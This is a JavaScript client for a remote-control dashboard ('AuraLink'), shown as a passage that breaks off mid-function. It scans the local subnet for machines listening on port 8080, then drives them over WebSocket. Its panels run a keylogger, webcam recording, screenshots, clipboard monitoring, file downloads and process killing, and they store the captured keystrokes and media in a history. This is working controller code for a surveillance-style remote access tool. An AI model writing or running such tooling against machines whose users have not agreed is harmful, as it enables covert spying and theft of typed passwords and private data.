/* --- GLOBAL VARIABLES --- */
let websocket = null;
let intervalUptime = null;
let intervalSensors = null;
let intervalPing = null; 
let systemStartTime = 0; 
let lastScreenshotUrl = null; 
let lastWebcamUrl = null;
let pingStartTime = 0;
let isKeylogStopping = false;
let isRecording = false;
let webcamTimer = null;
let webcamTimeout = null; 
let countdownVal = 10;
let isKeylogActive = false;
let isScanning = false; 

/* --- INITIALIZATION --- */
document.addEventListener('DOMContentLoaded', () => {
    if(typeof lucide !== 'undefined') lucide.createIcons();
    
    loadHistory();

    const savedClientIP = localStorage.getItem("auralink_client_ip");
    if (savedClientIP) {
        document.getElementById("intro-ip-input").value = savedClientIP;
    }

    const defaultNav = document.querySelector('.nav-item.active');
    if(defaultNav) switchTab('home', defaultNav);
    
    const btnConnect = document.getElementById("btnConnect");
    if(btnConnect) btnConnect.addEventListener("click", connectToServer);
    
    resetDashboardState();
});

/* --- INTRO / SCANNER LOGIC --- */

function toggleScanView() {
    const mainView = document.getElementById('intro-main-view');
    const scanView = document.getElementById('intro-scan-view');
    const headerArea = document.getElementById('intro-header-area'); 
    
    if(mainView.style.display === 'none') {
        headerArea.classList.remove('hidden-none');
        mainView.style.display = 'block';
        scanView.style.display = 'none';
        isScanning = false; 
    } else {
        headerArea.classList.add('hidden-none');
        mainView.style.display = 'none';
        scanView.style.display = 'flex';
    }
}

function loadHistory() {
    const raw = localStorage.getItem("auralink_history");
    const container = document.getElementById("history-chips");
    if (!container) return;
    
    if (raw) {
        const history = JSON.parse(raw);
        if (history.length > 0) {
            container.innerHTML = "";
            history.forEach(ip => {
                const chip = document.createElement("div");
                chip.className = "ip-chip";
                chip.innerHTML = `<i data-lucide="history"></i> ${ip}`;
                chip.onclick = () => { connectToTarget(ip); };
                container.appendChild(chip);
            });
            if(typeof lucide !== 'undefined') lucide.createIcons();
            return;
        }
    }
    container.innerHTML = `<span class="empty-history">No history found</span>`;
}

function saveToHistory(ip) {
    let history = [];
    const raw = localStorage.getItem("auralink_history");
    if (raw) history = JSON.parse(raw);
    
    history = history.filter(item => item !== ip);
    history.unshift(ip);
    if (history.length > 5) history.pop();
    
    localStorage.setItem("auralink_history", JSON.stringify(history));
}

function connectToTarget(ip) {
    document.getElementById("ipInput").value = ip;
    const overlay = document.getElementById('intro-overlay');
    overlay.classList.add('hidden-fade');
    setTimeout(() => {
        overlay.style.display = 'none';
        connectToServer(); 
    }, 500);
}

function handleIntroScan() {
    const clientIP = document.getElementById("intro-ip-input").value.trim();
    if (!clientIP) { alert("Please enter your Client IP first."); return; }
    
    localStorage.setItem("auralink_client_ip", clientIP);

    const parts = clientIP.split('.');
    if (parts.length !== 4) { alert("Invalid IP format. Example: 192.168.1.15"); return; }

    parts.pop(); 
    const subnet = parts.join('.'); 

    document.getElementById('scan-subnet').value = subnet;
    toggleScanView();
    startNetworkScan();
}

function startNetworkScan() {
    if (isScanning) return;
    
    const subnet = document.getElementById('scan-subnet').value.trim();
    if (!subnet) return alert("Subnet error");

    isScanning = true;
    const btnRescan = document.getElementById('btn-rescan');
    if(btnRescan) { btnRescan.innerText = "Scanning..."; btnRescan.disabled = true; }

    const list = document.getElementById('scan-results');
    list.innerHTML = ""; 
    
    const progressBar = document.getElementById('scan-progress');
    const statusText = document.getElementById('scan-status-text');
    
    let scannedCount = 0;
    const total = 254;
    let foundCount = 0;

    for (let i = 1; i <= 254; i++) {
        setTimeout(() => {
            if(!isScanning) return;
            const targetIP = `${subnet}.${i}`;
            const ws = new WebSocket(`ws://${targetIP}:8080/?t=${Date.now()}`);
            const timer = setTimeout(() => { if(ws.readyState !== WebSocket.OPEN) ws.close(); }, 2000); 

            ws.onopen = () => {
                clearTimeout(timer);
                foundCount++;
                const item = document.createElement("div");
                item.className = "scan-item";
                item.innerHTML = `
                    <div style="display:flex; align-items:center; gap:10px;">
                        <div class="scan-icon-box"><i data-lucide="monitor"></i></div>
                        <div style="display:flex; flex-direction:column;">
                            <strong>${targetIP}</strong>
                            <span style="font-size:0.75rem; color:#34d399">Online - Ready</span>
                        </div>
                    </div>
                    <button class="btn-gradient-blue" style="padding: 6px 15px; font-size:0.8rem; border-radius:10px;">Connect</button>
                `;
                item.onclick = () => {
                    isScanning = false;
                    if(ws.readyState === WebSocket.OPEN) ws.close();
                    connectToTarget(targetIP);
                };
                list.appendChild(item);
                if(typeof lucide !== 'undefined') lucide.createIcons();
                ws.close(); 
            };
            ws.onerror = () => { };
            ws.onclose = () => {
                scannedCount++;
                const pct = Math.floor((scannedCount / total) * 100);
                progressBar.style.width = pct + "%";
                statusText.innerText = `Scanning... ${pct}%`;

                if (scannedCount >= total) {
                    isScanning = false;
                    if(btnRescan) { btnRescan.innerText = "Scan Again"; btnRescan.disabled = false; }
                    statusText.innerText = `Scan Complete. Found ${foundCount} active servers.`;
                    if(foundCount === 0) list.innerHTML = `<div class="scan-placeholder"><i data-lucide="search-x"></i> No servers found on ${subnet}.x</div>`;
                    if(typeof lucide !== 'undefined') lucide.createIcons();
                }
            };
        }, i * 20); 
    }
}

function disconnectServer() {
    if (websocket) {
        websocket.onclose = null; 
        websocket.onerror = null;
        websocket.close();
        websocket = null;
    }
    const overlay = document.getElementById('intro-overlay');
    overlay.style.display = 'flex';
    setTimeout(() => { overlay.classList.remove('hidden-fade'); }, 10);
    resetDashboardState();
    setConnectedState(false);
    loadHistory(); 
}

/* --- TABS --- */
function switchTab(tabId, element) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
    
    const target = document.getElementById('tab-' + tabId);
    if(target) target.classList.add('active');
    if(element) element.classList.add('active');
    
    const titles = { 
        'home': 'Dashboard', 
        'apps': 'Application Manager', 
        'processes': 'System Processes', 
        'media': 'Screenshot Viewer', 
        'webcam': 'Webcam Stream', 
        'keylogger': 'Keylogger Records', 
        'power': 'Power Control',
        'clipboard': 'Clipboard Monitor',
        'tts': 'Text to Speech',
        'files': 'File Downloader'
    };
    const titleEl = document.getElementById('page-title');
    if(titleEl) titleEl.innerText = titles[tabId] || 'Dashboard';
}

function addActivityLog(msg) {
    const list = document.getElementById("activity-list");
    if (!list) return;
    const li = document.createElement("li");
    li.innerHTML = `<span class="dot-log blue"></span> ${msg}`;
    list.prepend(li);
    if (list.children.length > 50) list.removeChild(list.lastChild);
}

/* --- TOAST NOTIFICATIONS --- */
function showToast(message, type = 'success') {
    const container = document.getElementById('toast-container');
    if (!container) return;

    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    
    const icon = type === 'success' ? 'check-circle' : 'alert-circle';
    const color = type === 'success' ? '#34d399' : '#fb7185';
    
    toast.innerHTML = `<i data-lucide="${icon}" style="color: ${color}; width: 20px;"></i><span>${message}</span>`;
    container.appendChild(toast);
    if(typeof lucide !== 'undefined') lucide.createIcons();

    setTimeout(() => {
        toast.style.animation = "fadeOut 0.3s ease forwards";
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function updateSystemStatus(type, isActive) {
    let elId = "", activeClass = "";
    if (type === "keylog") { elId = "top-status-keylog"; activeClass = "active"; } 
    else if (type === "webcam") { elId = "top-status-webcam"; activeClass = "recording"; }
    const el = document.getElementById(elId);
    if (el) { isActive ? el.classList.add(activeClass) : el.classList.remove(activeClass); }
}

function connectToServer() {
    const ipInput = document.getElementById("ipInput");
    // Nếu đang ở màn hình Intro thì chưa có ipInput trong main, lấy từ localStorage hoặc input intro
    let ip = ipInput ? ipInput.value.trim() : '';
    
    // Fallback nếu kết nối từ lịch sử scan
    if (!ip) {
        const introInput = document.getElementById("intro-ip-input");
        if (introInput) ip = introInput.value.trim();
    }
    
    if (!ip) { showToast("Please enter Server IP!", "error"); return; }
    
    localStorage.setItem("auralink_last_ip", ip); 
    saveToHistory(ip);

    // Cập nhật lại UI input chính nếu cần
    if (ipInput) ipInput.value = ip;

    const wsUri = "ws://" + ip + ":8080/";
    
    if (websocket) {
        websocket.onclose = null;
        websocket.onerror = null;
        websocket.close();
    }

    try {
        websocket = new WebSocket(wsUri);
        websocket.onopen = () => { 
            // Ẩn màn hình intro nếu đang hiện
            const introOverlay = document.getElementById('intro-overlay');
            if(introOverlay) introOverlay.style.display = 'none';

            setConnectedState(true); 
            addActivityLog("Connected: " + ip); 
            showToast("Connected to Server Successfully"); 
            sendCmd("get-sys-info"); 
            startDashboardUpdates(); 
        };
        websocket.onclose = () => { 
            setConnectedState(false); 
            addActivityLog("Connection Closed"); 
            showToast("Connection Closed", "error"); 
            stopDashboardUpdates(); 
        };
        websocket.onerror = () => { 
            setConnectedState(false); 
            stopDashboardUpdates(); 
            console.log("WebSocket Error");
        };
        // Đã trỏ đúng về hàm xử lý trung tâm
        websocket.onmessage = (event) => { handleIncomingMessage(event.data); };

    } catch (e) {
        console.error("Connection Error:", e);
        showToast("Connection Failed", "error");
    }
}
function setConnectedState(isConnected) {
    const areaDisconnected = document.getElementById("conn-area-disconnected");
    const areaConnected = document.getElementById("conn-area-connected");
    const ipLabel = document.getElementById("connected-ip-label");
    const sysNetwork = document.getElementById("sys-network");

    if (isConnected) {
        areaDisconnected.classList.add("hidden");
        areaConnected.classList.remove("hidden");
        const ip = document.getElementById("ipInput").value;
        if(ipLabel) ipLabel.innerText = "Connected: " + ip;
        if(sysNetwork) { sysNetwork.innerText = "Connected"; sysNetwork.style.color = "#34d399"; }
    } else {
        areaDisconnected.classList.remove("hidden");
        areaConnected.classList.add("hidden");
        if(sysNetwork) { sysNetwork.innerText = "Disconnected"; sysNetwork.style.color = "#fb7185"; }
        resetDashboardState();
    }
}

function sendCmd(command) {
    if (websocket && websocket.readyState === WebSocket.OPEN) { websocket.send(command); console.log("Sent:", command); } 
    else { console.log("Socket not ready."); }
}

function sendTTS() {
    const text = document.getElementById("tts-input").value.trim();
    if (!text) { showToast("Please enter text", "error"); return; }
    sendCmd("tts " + text);
    showToast("Sent TTS Command");
    document.getElementById("tts-input").value = "";
}

/* --- UPDATE LOOPS --- */
function resetDashboardState() {
    document.getElementById("sys-hostname").innerText = "---";
    document.getElementById("sys-os").innerText = "---";
    document.getElementById("status-ram").innerText = "---";
    document.getElementById("status-batt").innerText = "---";
    document.getElementById("status-disk").innerText = "---";
    document.getElementById("status-procs").innerText = "---";
    document.getElementById("sys-uptime").innerText = "--:--:--";
    const sysNetwork = document.getElementById("sys-network");
    if(sysNetwork) { sysNetwork.innerText = "Disconnected"; sysNetwork.style.color = "#fb7185"; }
    const chartCpu = document.getElementById("chart-cpu");
    if(chartCpu) { chartCpu.style.setProperty('--p', 0); chartCpu.querySelector('span').innerText = "0%"; }
    const chartRam = document.getElementById("chart-ram");
    if(chartRam) { chartRam.style.setProperty('--p', 0); chartRam.querySelector('span').innerText = "0%"; }
}

function startDashboardUpdates() {
    systemStartTime = Date.now(); 
    if(intervalUptime) clearInterval(intervalUptime);
    intervalUptime = setInterval(() => {
        const diff = Math.floor((Date.now() - systemStartTime) / 1000);
        const h = Math.floor(diff / 3600).toString().padStart(2, '0');
        const m = Math.floor((diff % 3600) / 60).toString().padStart(2, '0');
        const s = (diff % 60).toString().padStart(2, '0');
        document.getElementById("sys-uptime").innerText = `${h}:${m}:${s}`;
    }, 1000);

    if(intervalPing) clearInterval(intervalPing);
    intervalPing = setInterval(() => { pingStartTime = Date.now(); sendCmd("ping"); }, 2000);

    if(intervalSensors) clearInterval(intervalSensors);
    intervalSensors = setInterval(() => { sendCmd("get-sys-info"); }, 3000); 
}

function stopDashboardUpdates() {
    if(intervalUptime) clearInterval(intervalUptime);
    if(intervalPing) clearInterval(intervalPing);
    if(intervalSensors) clearInterval(intervalSensors);
    resetDashboardState();
}

/* --- MESSAGE HANDLER --- */
/* --- MESSAGE HANDLER (PHIÊN BẢN TỔNG HỢP FIX LỖI) --- */
function handleIncomingMessage(data) {
    // 1. Giữ kết nối (Ping/Pong) - QUAN TRỌNG
    if (data.trim() === "pong") { return; }

    // 2. Xử lý Danh sách File (MỚI - File Manager)
    if (data.startsWith("DIR_LIST")) {
        renderFileBrowser(data); 
        return;
    }

    // 3. Xử lý Tải File (MỚI - Dùng dấu cách làm phân cách)
    if (data.startsWith("FILE_DOWNLOAD")) {
        // Cấu trúc: FILE_DOWNLOAD <Tên File> <Base64>
        const firstSpace = data.indexOf(" ");
        const lastSpace = data.lastIndexOf(" ");

        if (lastSpace > firstSpace) {
            const filename = data.substring(firstSpace + 1, lastSpace);
            const base64Data = data.substring(lastSpace + 1);
            
            // Gọi hàm lưu file
            const isSaved = saveBase64ToDisk(filename, base64Data);
            if (isSaved) {
                addActivityLog("Downloaded: " + filename);
                showToast("File Downloaded Successfully");
            }
        }
        return;
    }

    // 4. Xử lý Thông tin hệ thống (System Info)
    if (data.startsWith("sys-info ")) {
        const parts = data.substring(9).split("|");
        if (parts.length >= 2) {
            document.getElementById("sys-hostname").innerText = parts[0];
            document.getElementById("sys-os").innerText = parts[1];
        }
        if (parts.length >= 6) {
            document.getElementById("status-ram").innerText = parts[2];
            document.getElementById("status-batt").innerText = parts[3];
            document.getElementById("status-disk").innerText = parts[4];
            document.getElementById("status-procs").innerText = parts[5];
        }
        if (parts.length >= 8) {
            const cpuVal = parseInt(parts[6].trim());
            const ramVal = parseInt(parts[7].trim());
            const chartCpu = document.getElementById("chart-cpu");
            if(chartCpu) { chartCpu.style.setProperty('--p', cpuVal); chartCpu.querySelector('span').innerText = cpuVal + "%"; }
            const chartRam = document.getElementById("chart-ram");
            if(chartRam) { chartRam.style.setProperty('--p', ramVal); chartRam.querySelector('span').innerText = ramVal + "%"; }
        }
        return;
    }

    // 5. Xử lý Webcam (Video)
    if (data.startsWith("file ")) {
        handleVideoFile(data.substring(5).trim()); 
        addActivityLog("Webcam video received"); 
        showToast("Webcam Video Received"); 
        updateSystemStatus("webcam", false);
        return;
    } 

    // 6. Xử lý Screenshot
    if (data.startsWith("screenshot ")) { 
        handleScreenshotData(data); 
        return;
    }
    
    // 7. Xử lý Clipboard
    if (data.startsWith("CLIPBOARD_DATA:")) {
        const content = data.substring(15); 
        const box = document.getElementById("clip-output");
        if(box) {
             if(box.innerText.includes("Waiting for")) box.innerText = "";
             box.innerText += content + "\n-------------------\n";
             box.scrollTop = box.scrollHeight;
        }
        showToast("Clipboard Data Received");
        return;
    }

    // 8. Xử lý Keylogger
    if (data.startsWith("MODE:") || data.startsWith("STATUS:") || data.startsWith("---RAW---")) {
        parseKeylogData(data); // Hàm xử lý thông minh mới
        return;
    }
    else if (data.startsWith("KEYLOG_DATA:")) { 
        // Fallback cho định dạng cũ (nếu có)
        const content = data.substring(12);
        const box = document.getElementById("keylog-text");
        if(box) { box.innerText += content; }
        return;
    }

    // 9. Xử lý Danh sách Ứng dụng (App List)
    if (data.startsWith("DANH SACH UNG DUNG")) { 
        renderAppList(data); 
        addActivityLog("App list updated"); 
        showToast("Application List Updated");
        return;
    }

    // 10. Xử lý Danh sách Tiến trình (Process List)
    if (data.includes("PID") && data.includes("RAM")) { 
        renderProcessTable(data, "process-list-body"); 
        addActivityLog("Process list updated"); 
        showToast("Process List Updated");
        return;
    }

    // 11. Các thông báo trạng thái khác từ Server
    if (true) { // Các tin nhắn dạng text thông thường
        if(data.includes("Keylogger started")) { updateSystemStatus("keylog", true); showToast("Keylogger Started"); }
        if(data.includes("Keylogger stopped")) { updateSystemStatus("keylog", false); showToast("Keylogger Stopped"); }
        if(data.includes("Started recording")) { updateSystemStatus("webcam", true); showToast("Webcam Recording Started"); }
        if(data.includes("Server: Clipboard Monitor")) { showToast(data.replace("Server: ", "")); }
        if(data.includes("Server: OK, speaking")) { showToast("Client is speaking now", "success"); }

        // Log vào Activity
        if(data.includes("Server:")) {
            console.log(data);
            addActivityLog(data.replace("Server: ", ""));
        }
        
        // Báo lỗi
        if(data.includes("Error") || data.includes("Loi") || data.includes("failed")) showToast(data, "error");
    }
}

function clearClipboardDisplay() {
    const box = document.getElementById("clip-output");
    if(box) box.innerHTML = '<span class="text-muted">Waiting for clipboard data...</span>';
}

function viewHistoryClipboard(element) {
    const encodedText = element.getAttribute("data-full");
    if(!encodedText) return;
    
    const text = decodeURIComponent(encodedText);
    const box = document.getElementById("clip-output");
    if(box) { 
        box.innerText = "[HISTORY VIEW]\n-------------------\n" + text; 
        box.scrollTop = 0; 
    }
}
function clearKeylogDisplay() {
    document.getElementById("keylog-raw").innerText = "Waiting...";
    document.getElementById("keylog-text").innerText = "Waiting...";
    document.getElementById("kl-mode").innerText = "Mode: ---";
    document.getElementById("kl-status").innerText = "Type: ---";
    showToast("Screens Cleared"); 
}

function parseKeylogData(data) {
    const lines = data.split('\n');
    let currentSection = "";
    let rawContent = "";
    let textContent = "";
    
    // [PHẦN 1: TÁCH DỮ LIỆU] (Giữ nguyên logic cũ)
    lines.forEach(line => {
        if (line.startsWith("MODE:")) {
            const el = document.getElementById("kl-mode");
            if(el) el.innerText = line.trim();
        }
        else if (line.startsWith("STATUS:")) {
            const el = document.getElementById("kl-status");
            if(el) {
                el.innerText = line.trim();
                if(line.includes("VIETNAMESE") || line.includes("Unikey")) el.style.color = "#fb7185";
                else el.style.color = "#60a5fa";
            }
        }
        else if (line.trim() === "---RAW---") currentSection = "raw";
        else if (line.trim() === "---TEXT---") currentSection = "text";
        else {
            if (currentSection === "raw") rawContent += line + "\n";
            else if (currentSection === "text") textContent += line + "\n";
        }
    });

    // [PHẦN 2: HIỂN THỊ LÊN MÀN HÌNH]
    const rawBox = document.getElementById("keylog-raw");
    const textBox = document.getElementById("keylog-text");

    if(rawBox) {
        // Xóa thông báo chờ nếu có dữ liệu mới
        if(rawBox.innerText.includes("Waiting...") || rawBox.innerText.includes("Session started")) rawBox.innerText = "";
        rawBox.innerText += rawContent; // Cộng dồn hoặc thay thế tùy ý (ở đây cộng dồn cho an toàn)
        rawBox.scrollTop = rawBox.scrollHeight;
    }
    
    if(textBox) {
        if(textBox.innerText.includes("Waiting...") || textBox.innerText.includes("Session started")) textBox.innerText = "";
        textBox.innerText += textContent;
        textBox.scrollTop = textBox.scrollHeight;
    }

    // [PHẦN 3: LOGIC TỰ ĐỘNG LƯU & DỪNG] (QUAN TRỌNG NHẤT)
    if (isKeylogStopping) {
        // Tắt cờ hiệu ngay để không chạy lại lần 2
        isKeylogStopping = false;

        // 1. Gửi lệnh dừng Server
        sendCmd('stop-keylog');
        isKeylogActive = false;

        // 2. Lấy toàn bộ nội dung sạch sẽ để lưu
        let finalRaw = rawBox ? rawBox.innerText.replace("Waiting...", "").replace("Session started...", "").trim() : "";
        let finalText = textBox ? textBox.innerText.replace("Waiting...", "").replace("Session started...", "").trim() : "";

        if(finalRaw.length > 0 || finalText.length > 0) {
            // Ghép 2 phần lại
            let combinedLog = finalRaw + "|||SPLIT|||" + finalText;
            
            // Lưu vào History
            addToHistory('keylog', null, combinedLog);
            showToast("Success: Fetched & Saved to History"); 
        } else {
            showToast("Stopped (No data found)", "warning");
        }
    }
}


function viewHistoryKeylog(element) {
    const encodedText = element.getAttribute("data-full");
    if(!encodedText) return;
    
    const fullText = decodeURIComponent(encodedText);
    
    const rawBox = document.getElementById("keylog-raw");
    const textBox = document.getElementById("keylog-text");
    
    // Reset giao diện trước
    if(rawBox) rawBox.innerText = "";
    if(textBox) textBox.innerText = "";

    // Kiểm tra xem dữ liệu có phải loại đã gộp 2 màn hình không
    if (fullText.includes("|||SPLIT|||")) {
        // Tách ra làm 2 phần dựa vào dấu phân cách
        const parts = fullText.split("|||SPLIT|||");
        const rawPart = parts[0];
        const textPart = parts[1];
        
        if(rawBox) {
            rawBox.innerText = "[HISTORY VIEW - RAW]\n" + rawPart;
            rawBox.scrollTop = 0;
        }
        if(textBox) {
            textBox.innerText = "[HISTORY VIEW - TEXT]\n" + textPart;
            textBox.scrollTop = 0;
        }
    } else {
        // Fallback: Nếu là log cũ (chưa có split), hiện tạm bên Text
        if(textBox) textBox.innerText = "[HISTORY VIEW]\n" + fullText;
    }
}

/* --- SCREENSHOT & HISTORY --- */
function handleScreenshotData(data) {
    const parts = data.split(" ");
    if (parts.length < 4) return;
    const width = parseInt(parts[1]), height = parseInt(parts[2]), base64 = parts[3];
    drawScreenshotToCanvas(width, height, base64);
    
    const canvas = document.getElementById("screenshot-canvas");
    lastScreenshotUrl = canvas.toDataURL("image/png");
    addToHistory('screenshot', lastScreenshotUrl, `Screenshot ${width}x${height}`);
    addActivityLog(`Screenshot captured (${width}x${height})`);
    showToast("Screenshot Captured"); 
}

function drawScreenshotToCanvas(width, height, base64orUrl) {
    const previewBox = document.getElementById("screenshot-preview");
    previewBox.innerHTML = ""; 
    if (base64orUrl.startsWith("data:image")) {
        const img = new Image();
        img.onload = function() {
            const canvas = document.createElement("canvas");
            canvas.id = "screenshot-canvas"; canvas.width = img.width; canvas.height = img.height;
            canvas.getContext("2d").drawImage(img, 0, 0);
            previewBox.appendChild(canvas);
            enableSaveButton();
        };
        img.src = base64orUrl;
        lastScreenshotUrl = base64orUrl;
    } else {
        const binaryString = atob(base64orUrl);
        const bytes = new Uint8ClampedArray(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) bytes[i] = binaryString.charCodeAt(i);
        for (let i = 0; i < bytes.length; i += 4) {
            const b = bytes[i]; bytes[i] = bytes[i+2]; bytes[i+2] = b; bytes[i+3] = 255;
        }
        const canvas = document.createElement("canvas");
        canvas.id = "screenshot-canvas"; canvas.width = width; canvas.height = height;
        canvas.getContext("2d").putImageData(new ImageData(bytes, width, height), 0, 0);
        previewBox.appendChild(canvas);
        enableSaveButton();
    }
}

function enableSaveButton() {
    const btnSave = document.getElementById("btn-save-screen");
    if(btnSave) { btnSave.disabled = false; btnSave.style.opacity = "1"; btnSave.style.cursor = "pointer"; }
}

function downloadScreenshot() {
    const canvas = document.getElementById("screenshot-canvas");
    if(!canvas) return;
    const fmt = document.getElementById("img-format").value;
    const link = document.createElement('a');
    link.download = `screenshot_${Date.now()}.${fmt}`;
    link.href = canvas.toDataURL("image/" + fmt, 0.9);
    document.body.appendChild(link); link.click(); document.body.removeChild(link);
    showToast("Image Saved"); 
}

function restoreHistoryItem(type, url) {
    if (type === 'screenshot') {
        drawScreenshotToCanvas(0, 0, url);
        document.querySelector('.main-panel').scrollTop = 0;
    }
}

/* --- WEBCAM LOGIC --- */
function toggleWebcam() {
    const btn = document.getElementById("btn-record");
    if (isRecording) return; 
    sendCmd("capture"); 
    isRecording = true;
    countdownVal = 10;
    btn.disabled = true;
    updateBtnText(countdownVal);
    if(webcamTimer) clearInterval(webcamTimer);
    webcamTimer = setInterval(() => {
        countdownVal--;
        if (countdownVal > 0) { updateBtnText(countdownVal); } 
        else {
            clearInterval(webcamTimer);
            btn.innerHTML = `<i data-lucide="loader" class="btn-icon-inside spinning"></i> Processing...`;
            if(typeof lucide !== 'undefined') lucide.createIcons();
        }
    }, 1000);
    if(webcamTimeout) clearTimeout(webcamTimeout);
    webcamTimeout = setTimeout(() => {
        if(isRecording) { showToast("Timeout: No video from server", "error"); resetWebcamUI(); }
    }, 15000);
}

function updateBtnText(sec) {
    const btn = document.getElementById("btn-record");
    if(btn) {
        btn.innerHTML = `<i data-lucide="video" class="btn-icon-inside"></i> Recording... ${sec}s`;
        if(typeof lucide !== 'undefined') lucide.createIcons();
    }
}

function handleVideoFile(base64) {
    if(webcamTimeout) clearTimeout(webcamTimeout);
    resetWebcamUI();
    try {
        const cleanBase64 = base64.replace(/\s/g, '');
        const byteChars = atob(cleanBase64);
        const byteNumbers = new Array(byteChars.length);
        for (let i = 0; i < byteChars.length; i++) byteNumbers[i] = byteChars.charCodeAt(i);
        const blob = new Blob([new Uint8Array(byteNumbers)], {type: "video/mp4"});
        const url = URL.createObjectURL(blob);
        const previewBox = document.getElementById("webcam-preview");
        if(previewBox) previewBox.innerHTML = `<video src="${url}" controls autoplay style="width:100%; height:100%; border-radius:12px;"></video>`;
        const dl = document.getElementById("webcam-download-area");
        if(dl) { dl.innerHTML = `<a href="${url}" download="webcam_${Date.now()}.mp4" class="btn-download-pill"><i data-lucide="download"></i> Download Video</a>`; if(typeof lucide !== 'undefined') lucide.createIcons(); }
        lastWebcamUrl = url;
        addToHistory('webcam', lastWebcamUrl, 'Video Clip');
    } catch (e) { console.error("Video error:", e); showToast("Error decoding video", "error"); }
}

function resetWebcamUI() {
    isRecording = false;
    if(webcamTimer) clearInterval(webcamTimer);
    const btn = document.getElementById("btn-record");
    if(btn) { 
        btn.disabled = false;
        btn.className = "btn-gradient-hybrid large"; 
        btn.innerHTML = `<i data-lucide="radio" class="btn-icon-inside"></i> Record (10s)`; 
    }
    if(typeof lucide !== 'undefined') lucide.createIcons();
}

// --- HÀM QUẢN LÝ HISTORY TỔNG HỢP (KEYLOG + CLIPBOARD + MEDIA) ---
function addToHistory(type, url, textContent = "") {
    let listId = "";
    if (type === 'screenshot') listId = 'screenshot-history-list';
    else if (type === 'webcam') listId = 'webcam-history-list';
    else if (type === 'keylog') listId = 'keylog-history-list';
    else if (type === 'clipboard') listId = 'clipboard-history-list'; // Thêm dòng này
    
    const listEl = document.getElementById(listId);
    if (!listEl) return;
    
    if (listEl.querySelector('.text-center-small')) listEl.innerHTML = '';
    
    const item = document.createElement('div');
    item.className = 'history-item';
    
    const time = new Date().toLocaleTimeString();
    
    // XỬ LÝ GIAO DIỆN CHO TỪNG LOẠI
    if (type === 'screenshot' || type === 'webcam') {
        // Giao diện Media (Ảnh/Video)
        let mediaHtml = type === 'screenshot' 
            ? `<img src="${url}" class="history-thumb" onclick="restoreHistoryItem('screenshot', '${url}')" title="View">` 
            : `<video src="${url}" class="history-thumb" controls></video>`;
            
        item.innerHTML = `
            ${mediaHtml}
            <div class="history-meta">
                <span>${time}</span>
                <button class="btn-trash" onclick="deleteHistoryItem(this)"><i data-lucide="trash-2"></i></button>
            </div>`;
    } 
    else {
        // Giao diện Text (Keylog / Clipboard)
        const safeText = encodeURIComponent(textContent);
        // Tạo preview ngắn (50 ký tự đầu)
        let preview = textContent.substring(0, 50).replace(/\n/g, " ") + (textContent.length > 50 ? "..." : "");
        if(preview.length === 0) preview = "(Empty data)";

        // Icon khác nhau
        let icon = type === 'keylog' ? 'file-text' : 'clipboard';
        let clickFunc = type === 'keylog' ? 'viewHistoryKeylog(this)' : 'viewHistoryClipboard(this)';
        
        item.innerHTML = `
            <div class="keylog-preview" onclick="${clickFunc}" data-full="${safeText}">
                <i data-lucide="${icon}" style="width:16px; margin-right:5px;"></i> 
                <span>${preview}</span>
            </div>
            <div class="history-meta">
                <span>${time}</span>
                <button class="btn-trash" onclick="deleteHistoryItem(this)"><i data-lucide="trash-2"></i></button>
            </div>`;
    }
    
    listEl.prepend(item);
    if(typeof lucide !== 'undefined') lucide.createIcons();
}

function deleteHistoryItem(btn) { 
    if(confirm("Delete this item?")) {
        const list = btn.closest('.history-list');
        btn.closest('.history-item').remove(); 
        if (list.children.length === 0) list.innerHTML = '<p class="text-center-small">Empty</p>';
    }
}

function clearHistory(type) { 
    if(confirm("Clear all history for this section?")) {
        let id;
        if (type === 'screenshot') id = 'screenshot-history-list';
        else if (type === 'webcam') id = 'webcam-history-list';
        else if (type === 'keylog') id = 'keylog-history-list'; 
        else if (type === 'clipboard') id = 'clipboard-history-list'; // Thêm dòng này
        
        const el = document.getElementById(id);
        if(el) el.innerHTML = '<p class="text-center-small">Empty</p>'; 
        showToast("History Cleared"); 
    }
}

function renderAppList(text) {
    const tbody = document.getElementById("app-list-body"); if(!tbody) return;
    tbody.innerHTML = "";
    text.split("\n").forEach(line => {
        line = line.trim();
        if(line.startsWith("[")) tbody.dataset.currName = line.substring(line.indexOf("]") + 1).trim();
        else if (line.startsWith("Exe:")) {
            let n = tbody.dataset.currName, s = `<span style="color:#fb7185">Stopped</span>`;
            if(n.includes("(RUNNING)")) { s = `<span style="color:#34d399; font-weight:bold;">Running</span>`; n = n.replace("(RUNNING)", "").trim(); }
            const tr = document.createElement("tr");
            tr.innerHTML = `<td><i data-lucide="box" style="width:16px"></i></td><td><strong>${n}</strong></td><td><span style="font-size:0.8rem; color:#64748b">${line.substring(4).trim()}</span></td><td>${s}</td>`;
            tbody.appendChild(tr);
        }
    });
    if(typeof lucide !== 'undefined') lucide.createIcons();
}

function handleAppAction(action) { 
    const v = document.getElementById("appInput").value; 
    if(!v) { showToast("Please enter App Name", "error"); return; }
    let cmd = "";
    if (action === 'start') cmd = `start-app ${v}`;
    else if (action === 'stop' || action === 'kill') cmd = `stop-app ${v}`;
    else cmd = `${action} ${v}`;
    sendCmd(cmd); 
}

function handleProcessAction(action, directVal = null) { 
    // Nếu có directVal (bấm nút) thì dùng luôn, nếu không thì lấy từ ô input
    const v = directVal || document.getElementById("procInput").value; 
    
    if(!v) { showToast("Please enter PID or Name", "error"); return; }
    
    // Thêm xác nhận trước khi kill để tránh bấm nhầm
    if (action === 'kill') {
        if (!confirm(`Are you sure you want to KILL process PID: ${v}?`)) return;
    }

    sendCmd(`${action} ${v}`); 
    
    // Sau khi kill, tự động refresh lại danh sách sau 1 giây
    if (action === 'kill') {
        setTimeout(() => sendCmd('ps'), 1000);
    }
}

function renderProcessTable(d, id) {
    const tb = document.getElementById(id);
    if (!tb) return;
    tb.innerHTML = "";

    // Dữ liệu Server trả về theo thứ tự: PID [0] | RAM [1] | Threads [2] | Name [3]
    const lines = d.trim().split('\n');
    
    lines.slice(1).forEach(r => {
        const c = r.split('\t');
        if (c.length >= 4) {
            const pid = c[0];
            const ramRaw = parseFloat(c[1]); // Chuyển RAM sang số để kiểm tra
            const threads = c[2];
            const name = c[3];

            // Nếu RAM <= 0 (Process hệ thống/bảo mật), hiện "N/A" màu xám
            let ramDisplay;
            if (ramRaw <= 0) {
